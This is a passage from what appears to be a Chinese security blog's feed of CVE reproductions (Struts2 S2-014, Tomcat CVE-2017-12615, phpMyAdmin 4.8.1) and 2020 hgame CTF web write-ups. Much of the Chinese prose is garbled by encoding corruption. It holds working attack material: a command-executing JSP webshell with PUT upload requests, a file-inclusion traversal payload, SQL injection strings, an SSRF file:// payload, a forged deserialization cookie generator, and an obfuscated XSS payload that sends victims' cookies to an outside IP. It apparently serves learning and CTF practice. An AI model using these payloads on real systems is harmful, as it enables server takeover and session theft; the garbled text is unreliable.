&#39;xxx&#39;:&#39;&#39;&#39;${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;echo structs2_s2-014_vuln_checkflag&quot;))}&#39;&#39;&#39;    }    try :        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})        if &quot;structs2_s2-014_vuln_checkflag&quot; in res.text and res.status_code==200:            return True    except :        pass    return False</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/02/08/S2-013_S2-014è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/">https://explorersss.github.io/2020/02/08/S2-013_S2-014è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´CVE-2017-12615</title>
      <link href="/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/"/>
      <url>/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰"><a href="#Tomcat-PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰" class="headerlink" title="Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰"></a>Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p> Apache Tomcat 7.0.0 - 7.0.79 </p><p>å¹³å°: Windows </p><p> å¯ç”¨äº† HTTP PUT è¯·æ±‚æ–¹æ³•  (conf/web.xml ä¸­å¯¹äº DefaultServlet çš„ readonly è®¾ç½®ä¸º false)</p><h2 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h2><p>ä¸èƒ½ç›´æ¥ä¸Šä¼ jspç»“å°¾çš„æ–‡ä»¶</p><p>åˆ©ç”¨windowså¹³å°ä¸‹:<code>sample.txt::$DATA</code>ç­‰ä»·äº<code>sample.txt</code>çš„ç‰¹æ€§æ¥å†™shell</p><pre><code>PUT /111.jsp::$DATA HTTP/1.1Host: 10.1.1.6:8080User-Agent: JNTASSDNT: 1Connection: close...jsp shell...</code></pre><pre><code>PUT /111.jsp/ HTTP/1.1Host: 10.1.1.6:8080User-Agent: JNTASSDNT: 1Connection: close...jsp shell...</code></pre><pre><code class="java">&lt;%    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print(&quot;&lt;pre&gt;&quot;);        while((a=in.read(b))!=-1){            out.println(new String(b));        }        out.print(&quot;&lt;/pre&gt;&quot;);    }%&gt;</code></pre><h2 id="æ£€æµ‹è„šæœ¬"><a href="#æ£€æµ‹è„šæœ¬" class="headerlink" title="æ£€æµ‹è„šæœ¬"></a>æ£€æµ‹è„šæœ¬</h2><pre><code class="python">import requestsdef poc(url):    filename=&quot;tomcat_check_vuln.txt&quot;    content=&quot;test&quot;    try:        requests.put(url+&quot;/&quot;+filename,data=conetent)        res=requests.get(url+&quot;/&quot;+filename)    except :        return False    if res.status_code==200:        return True    return False</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="https://explorersss.github.io/2020/02/08/Tomcat">https://explorersss.github.io/2020/02/08/Tomcat</a> PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´CVE-2017-12615/](<a href="https://explorersss.github.io/2020/02/08/Tomcat">https://explorersss.github.io/2020/02/08/Tomcat</a> PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´CVE-2017-12615/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin 4.8.1 rce</title>
      <link href="/2020/02/08/phpmyadmin%204.8.1%20rce/"/>
      <url>/2020/02/08/phpmyadmin%204.8.1%20rce/</url>
      
        <content type="html"><![CDATA[<h1 id="phpmyadmin-4-8-1-rce"><a href="#phpmyadmin-4-8-1-rce" class="headerlink" title="phpmyadmin 4.8.1 rce"></a>phpmyadmin 4.8.1 rce</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p> phpMyAdmin 4.8.0 and 4.8.1 </p><p>ç™»é™†è´¦å·</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ç¯å¢ƒ:phpstudy 2018,windows 10</p><p>æ¼æ´ä½ç½®:<code>index.php</code>:57</p><pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) {    include $_REQUEST[&#39;target&#39;];    exit;}</code></pre><p>éå¸¸æ˜æ˜¾çš„ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´</p><p>å‰é¢å‡ ä¸ªæ¡ä»¶éƒ½å¾ˆå¥½æ»¡è¶³,æˆ‘ä»¬çœ‹ä¸‹æœ€åä¸€ä¸ª<code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code></p><p>è·Ÿè¿›å»</p><pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = [])    {        if (empty($whitelist)) {            $whitelist = self::$goto_whitelist;        }        if (! isset($page) || !is_string($page)) {            return false;        }        if (in_array($page, $whitelist)) {            return true;        }        $_page = mb_substr(            $page,            0,            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) {            return true;        }        $_page = urldecode($page);        $_page = mb_substr(            $_page,            0,            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) {            return true;        }        return false;    }</code></pre><p>è¦è¿”å›<code>true</code>çš„è¯,éœ€è¦<code>$page</code>ä»å¼€å¤´åˆ°ç¬¬ä¸€ä¸ª<code>?</code>ä¹‹é—´çš„å­—ç¬¦ä¸²åœ¨ç™½åå•ä¸­,æœ‰ä»¥ä¸‹ç™½åå•</p><pre><code class="php">array (  0 =&gt; &#39;db_datadict.php&#39;,....)</code></pre><p>å› ä¸ºå¤ç°ç¯å¢ƒæ˜¯åœ¨windowsä¸‹,windowsæ–‡ä»¶åä¸èƒ½åŒ…å«<code>?</code>,æ‰€ä»¥<code>db_datadict.php?</code>ä¼šå˜ä¸º<code>db_datadict.php</code>æ˜¯ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶,æˆ‘ä»¬ä¾¿æ— æ³•ç”¨<code>../</code>æ¥ç©¿æ¢­ç›®å½•äº†,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>$_page = urldecode($page);</code></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ <code>db_datadict.php%253f</code>æ¥ç»•è¿‡</p><p>é€šç”¨çš„payload:</p><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p><p>å¯ä»¥é€šè¿‡<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> æ¥å†™shellåˆ°æˆ‘ä»¬çš„sessionä¸­</p><p><img src="https://i.loli.net/2020/02/08/p4l2vM6JOLsTGCd.png" alt="image1794"></p><p><img src="https://i.loli.net/2020/02/08/wUZHdhJx9KSQRG7.png" alt="image1859"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p><p>å¯ä»¥é€šè¿‡<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> æ¥å†™shellåˆ°æˆ‘ä»¬çš„sessionä¸­</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="https://explorersss.github.io/2020/02/08/phpmyadmin">https://explorersss.github.io/2020/02/08/phpmyadmin</a> 4.8.1 rce/](<a href="https://explorersss.github.io/2020/02/08/phpmyadmin">https://explorersss.github.io/2020/02/08/phpmyadmin</a> 4.8.1 rce/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020hgame</title>
      <link href="/2020/02/07/2020hgame/"/>
      <url>/2020/02/07/2020hgame/</url>
      
        <content type="html"><![CDATA[<h1 id="2020hgame"><a href="#2020hgame" class="headerlink" title="2020hgame"></a>2020hgame</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos-çš„åšå®¢"><a href="#Cosmos-çš„åšå®¢" class="headerlink" title="Cosmos çš„åšå®¢"></a>Cosmos çš„åšå®¢</h3><blockquote><p>ä¸è¿‡æœ‰å¤§èŒ„å­å‘Šè¯‰æˆ‘çš„<strong>ç‰ˆæœ¬ç®¡ç†å·¥å…·</strong>ä»¥åŠ GitHubï¼Œæˆ‘æ”¹èµ·æ¥ä¹ŸæŒºæ–¹ä¾¿çš„ã€‚ </p></blockquote><p>æ ¹æ®æç¤ºä¸‹è½½.git</p><pre><code class="bash">$ git remote -v#æŸ¥çœ‹git</code></pre><p>æŸ¥çœ‹æäº¤å†å²æ‹¿åˆ°flag</p><h3 id="è¡—å¤´éœ¸ç‹"><a href="#è¡—å¤´éœ¸ç‹" class="headerlink" title="è¡—å¤´éœ¸ç‹"></a>è¡—å¤´éœ¸ç‹</h3><p>è€ƒå¯Ÿå¯¹httpçš„äº†è§£</p><pre><code>GET / HTTP/1.1Host: kyaru.hgame.n3ko.coCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Cosmos BrowerAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7referer: https://vidar.club/ x-forwarded-for: 127.0.0.1If-Unmodified-Since: Fri, 02 Jan 2077 00:00:00 GMTConnection: close</code></pre><h3 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h3><p>burpæ‹¦æˆª</p><p>ä¿®æ”¹GETä¸ºpost</p><h3 id="é¸¡ä½ å¤ªç¾"><a href="#é¸¡ä½ å¤ªç¾" class="headerlink" title="é¸¡ä½ å¤ªç¾"></a>é¸¡ä½ å¤ªç¾</h3><p>æ‹¦æˆªajaxè¯·æ±‚,ä¿®æ”¹åˆ†æ•°</p><h3 id="Cosmosçš„åšå®¢åå°"><a href="#Cosmosçš„åšå®¢åå°" class="headerlink" title="Cosmosçš„åšå®¢åå°"></a>Cosmosçš„åšå®¢åå°</h3><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;session_start();//Only for debugif (DEBUG_MODE){    if(isset($_GET[&#39;debug&#39;])) {        $debug = $_GET[&#39;debug&#39;];        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {            die(&quot;args error!&quot;);        }        eval(&quot;var_dump($$debug);&quot;);    }}if(isset($_SESSION[&#39;username&#39;])) {    header(&quot;Location: admin.php&quot;);    exit();}else {    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {        if ($admin_password == md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] === $admin_username){            $_SESSION[&#39;username&#39;] = $_POST[&#39;username&#39;];            header(&quot;Location: admin.php&quot;);            exit();        }        else {            echo &quot;Ã§Â”Â¨Ã¦ÂˆÂ·Ã¥ÂÂÃ¦ÂˆÂ–Ã¥Â¯Â†Ã§ ÂÃ©Â”Â™Ã¨Â¯Â¯&quot;;        }    }}?&gt;</code></pre><p>adminpassword: 0e114902927253523756713132279690 </p><p>å¯†ç ä½¿ç”¨==æ¥è¿›è¡Œmd5æ ¡éªŒ,æ‰¾ä¸ª0eå¼€å¤´çš„å¯†ç å³å¯ç»•è¿‡(QNKCDZO)</p><p>adminusername: Cosmos! </p><p>index.php</p><pre><code class="php">&lt;?phperror_reporting(0);session_start();if(isset($_SESSION[&#39;username&#39;])) {    header(&quot;Location: admin.php&quot;);    exit();}$action = @$_GET[&#39;action&#39;];$filter = &quot;/config|etc|flag/i&quot;;if (isset($_GET[&#39;action&#39;]) &amp;&amp; !empty($_GET[&#39;action&#39;])) {    if(preg_match($filter, $_GET[&#39;action&#39;])) {        echo &quot;Hacker get out!&quot;;        exit();    }        include $action;}elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) {    header(&quot;Location: ?action=login.php&quot;);    exit();}</code></pre><p>admin.php</p><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;session_start();if(!isset($_SESSION[&#39;username&#39;])) {    header(&#39;Location: index.php&#39;);    exit();}function insert_img() {    if (isset($_POST[&#39;img_url&#39;])) {        $img_url = @$_POST[&#39;img_url&#39;];        $url_array = parse_url($img_url);        if (@$url_array[&#39;host&#39;] !== &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !== &quot;timgsa.baidu.com&quot;) {            return false;        }           $c = curl_init();        curl_setopt($c, CURLOPT_URL, $img_url);        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);        $res = curl_exec($c);        curl_close($c);        $avatar = base64_encode($res);        if(filter_var($img_url, FILTER_VALIDATE_URL)) {            return $avatar;        }    }    else {        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));    }}?&gt;&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;&#39;&gt;</code></pre><p>file%3A%2F%2Flocalhost%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag</p><p>hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</p><h3 id="Cosmosçš„ç•™è¨€æ¿-1"><a href="#Cosmosçš„ç•™è¨€æ¿-1" class="headerlink" title="Cosmosçš„ç•™è¨€æ¿-1"></a>Cosmosçš„ç•™è¨€æ¿-1</h3><p>å•å¼•å·é—­åˆ</p><p>è¿‡æ»¤:select</p><p>é»‘åå•:ç©ºæ ¼</p><pre><code>0&#39;/**/union/**/select/**/group_concat(schema_name)/**/FROM/**/information_schema.schemata#information_schema,easysql0&#39;/**/union/**/select/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#f1aggggggggggggg,messages#GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/=/**/&#39;f1aggggggggggggg&#39;fl4444444ghgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><h3 id="Cosmosçš„æ–°è¯­è¨€"><a href="#Cosmosçš„æ–°è¯­è¨€" class="headerlink" title="Cosmosçš„æ–°è¯­è¨€"></a>Cosmosçš„æ–°è¯­è¨€</h3><p>php</p><pre><code class="php">&lt;?php// function encrypt($str){//     $result = &#39;&#39;;//     for($i = 0; $i &lt; strlen($str); $i++){//         $result .= chr(ord($str[$i]) + 1);//     }//     return $result;// }function encrypt($str){    $result = &#39;&#39;;    for($i = 0; $i &lt; strlen($str); $i++){        $result .= chr(ord($str[$i]) - 1);    }    return $result;}$newcmd=&#39;$_POST[\&#39;token\&#39;]&#39;;$cmd=substr($_POST[&#39;cmd&#39;],0,strlen($_POST[&#39;cmd&#39;])-1);preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);$cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);while($cmd!==&#39;$_SERVER[\&#39;token\&#39;]&#39;){    $arr=array();    preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);    $newcmd=$arr[0].$newcmd.&quot;)&quot;;        $cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);}$cmd=(str_replace(&quot;base64_encode&quot;,&quot;base64_decode&quot;,$newcmd));    $dec=eval(&quot;echo &quot;.$cmd.&quot;;&quot;);?&gt;</code></pre><p>python </p><pre><code class="python">import requestsdef get_flag():    enccmd=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/mycode&quot;).text[159:]    enccmd=enccmd[:len(enccmd)-75]    html=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;).text[626:]    enc=html[:html.find(&quot;&lt;br&gt;&quot;)]    data={&quot;token&quot;:enc,&quot;cmd&quot;:enccmd}    dec=requests.post(&quot;http://127.0.0.1/&quot;,data=data).text    data={&quot;token&quot;:dec}    print(requests.post(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;,data=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}).text[626:])get_flag()</code></pre><h3 id="Cosmosçš„èŠå¤©å®¤"><a href="#Cosmosçš„èŠå¤©å®¤" class="headerlink" title="Cosmosçš„èŠå¤©å®¤"></a>Cosmosçš„èŠå¤©å®¤</h3><pre><code class="html">&lt;svg/onload=&quot;[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\63\71\56\61\60\70\56\61\66\64\56\62\61\71\72\66\60\60\60\65\57\77\47\53\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145&#39;)()&quot; aa=</code></pre><p>è¾“å…¥ä¼šå˜æˆå¤§å†™</p><h3 id="åºåˆ—ä¹‹äº‰-Ordinal-Scale"><a href="#åºåˆ—ä¹‹äº‰-Ordinal-Scale" class="headerlink" title="åºåˆ—ä¹‹äº‰ - Ordinal Scale"></a>åºåˆ—ä¹‹äº‰ - Ordinal Scale</h3><p>è¿™ä¸€é¢˜è¦è®©<code>$_SESSION[&#39;rank&#39;]===1</code>æ—¶,æœ‰flag</p><p>è€Œé»˜è®¤çš„é€»è¾‘æ˜¯æ²¡æ³•å®ç°çš„</p><pre><code class="php">        if($this-&gt;rank &lt;= 2){                $this-&gt;rank = 2;            }</code></pre><p>é˜…è¯»ä»£ç å‘ç°ååºåˆ—åŒ–ç‚¹:</p><p><code>Monster</code>çš„<code>__construct</code>æ–¹æ³•</p><pre><code class="php">public function __construct($key){        $this-&gt;encryptKey = $key;        if(!isset($_COOKIE[&#39;monster&#39;])){            $this-&gt;Set();            return;        }        $monsterData = base64_decode($_COOKIE[&#39;monster&#39;]);        if(strlen($monsterData) &gt; 32){            $sign = substr($monsterData, -32);            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);            if(md5($monsterData . $this-&gt;encryptKey) === $sign){                $this-&gt;monsterData = unserialize($monsterData);            }else{                session_start();                session_destroy();                setcookie(&#39;monster&#39;, &#39;&#39;);                header(&#39;Location: index.php&#39;);                exit;            }        }        $this-&gt;Set();         }</code></pre><p>ä½†æ˜¯è¦çŸ¥é“<code>$key</code>æ‰èƒ½ååºåˆ—åŒ–</p><p>åœ¨<code>Game</code>çš„<code>__construct</code>æ–¹æ³•ä¸­çœ‹åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²<code>$key</code></p><pre><code class="php">class Game{       private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;    private $sign = &#39;&#39;;    public $rank;//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL    public function __construct($playerName){        $_SESSION[&#39;player&#39;] = $playerName;        if(!isset($_SESSION[&#39;exp&#39;])){            $_SESSION[&#39;exp&#39;] = 0;        }        $data = [$playerName, $this-&gt;encryptKey];        $this-&gt;init($data);//set sign        $this-&gt;monster = new Monster($this-&gt;sign);        $this-&gt;rank = new Rank();    }    private function init($data){        foreach($data as $key =&gt; $value){            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);            $this-&gt;sign .= md5($this-&gt;sign . $value);        }    }}</code></pre><p>å¯ä»¥ååºåˆ—åŒ–å,æˆ‘ä»¬å‘ç°<code>Fight</code>çš„<code>__destruct</code>æ–¹æ³•å¯ä»¥ä¿®æ”¹<code>$_SESSION[&#39;rank&#39;]</code></p><pre><code class="php">public function __destruct(){        // ç¡®ä¿ç¨‹åºæ˜¯è·‘åœ¨æœåŠ¡å™¨ä¸Šçš„ï¼        $this-&gt;serverKey = $_SERVER[&#39;key&#39;];        if($this-&gt;key === $this-&gt;serverKey){            $_SESSION[&#39;rank&#39;] = $this-&gt;rank;        }else{            // éæ­£å¸¸è®¿é—®            session_start();            session_destroy();            setcookie(&#39;monster&#39;, &#39;&#39;);            header(&#39;Location: index.php&#39;);            exit;        }    }</code></pre><p>ä½†æ˜¯è¿˜æœ‰<code>$this-&gt;key === $this-&gt;serverKey</code>é˜»æŒ è¿™æˆ‘ä»¬</p><p>å¦‚æœæˆ‘ä»¬èƒ½è·å¾—æˆ–ä¿®æ”¹<code>$_SERVER[&#39;key&#39;]</code>,ä¾¿å¯ä»¥æ‹¿åˆ°flagäº†</p><p>phpååºåˆ—åŒ–æœ‰ä¸ªç‰¹æ€§,ååºåˆ—åŒ–æ—¶,è‹¥å¯¹è±¡æ²¡æœ‰æŸä¸ªå€¼,ä¾¿ä¼šæ¢å¤æˆè¯¥å¯¹è±¡å¯¹åº”çš„ç±»çš„é»˜è®¤å€¼</p><p>å¦‚:</p><pre><code class="php">&lt;?phpclass test{    public $my_static = &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;;    public function __destruct()    {        echo $this-&gt;my_static;    }}class tesa{}$a=str_replace(&quot;tesa&quot;,&quot;test&quot;,serialize(new tesa()));unserialize($a);ç»“æœ:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre><p>äºæ˜¯æ„é€ </p><pre><code class="php">&lt;?phpclass Game{    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;    public $sign = &#39;&#39;;    public $rank;//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL    public function __construct($playerName){        $_SESSION[&#39;player&#39;] = $playerName;        if(!isset($_SESSION[&#39;exp&#39;])){            $_SESSION[&#39;exp&#39;] = 0;        }        $data = [$playerName, $this-&gt;encryptKey];        $this-&gt;init($data);//set sign    }    private function init($data){        foreach($data as $key =&gt; $value){            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);            $this-&gt;sign .= md5($this-&gt;sign . $value);        }    }}class Rank{    private $rank;//    private $serverKey;     // æœåŠ¡å™¨çš„ Key//    private $key;    public function __construct()    {        $this-&gt;rank=1;    }    public function __destruct(){    }}$s=new Rank();//$s=array(&#39;name&#39;=&gt;&#39;è”¡å»ºæ–Œ&#39;,&#39;no&#39;=&gt;999999999999999999);$a=new Game($_GET[&#39;name&#39;]);$sign = md5(serialize($s) . $a-&gt;sign);print( base64_encode(serialize($s) . $sign));?&gt;</code></pre><h3 id="äºŒå‘å…¥é­‚"><a href="#äºŒå‘å…¥é­‚" class="headerlink" title="äºŒå‘å…¥é­‚"></a>äºŒå‘å…¥é­‚</h3><p>åˆšçœ‹åˆ°è¿™é¢˜æ—¶æ˜¯æœ‰ç‚¹æ‡µçš„,ç½‘é¡µçš„å›¾ç‰‡æ˜¯å¦™è›™ç§å­,æ˜¯æƒ³è¯´äº¤ç§å­ä¸Šå»,ä½†æˆ‘æ²¡çœ‹æ‡‚/////</p><p>å‰ä¸€æ®µæ—¶é—´çˆ†å‡ºæ¥çš„mt_srandé€†å‘åˆšå¥½å¯ä»¥ç”¨åˆ°</p><p> <a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">https://github.com/ambionics/mt_rand-reverse</a> </p><pre><code class="php">import requestsimport osburp0_url = &quot;https://twoshot.hgame.n3ko.co:443/random.php?times=230&quot;burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).texta=eval(result)p = os.popen(&quot;python reverse_mt_rand.py %d %d 0 0&quot; % (a[0],a[227]) )x=p.read().strip()burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/verify.php&quot;burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;https://twoshot.hgame.n3ko.co&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}burp0_data = {&quot;ans&quot;: x}print(burp0_data)result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).textprint(result)</code></pre><h3 id="Cosmosçš„äºŒæ‰‹å¸‚åœº"><a href="#Cosmosçš„äºŒæ‰‹å¸‚åœº" class="headerlink" title="Cosmosçš„äºŒæ‰‹å¸‚åœº"></a>Cosmosçš„äºŒæ‰‹å¸‚åœº</h3><h4 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" 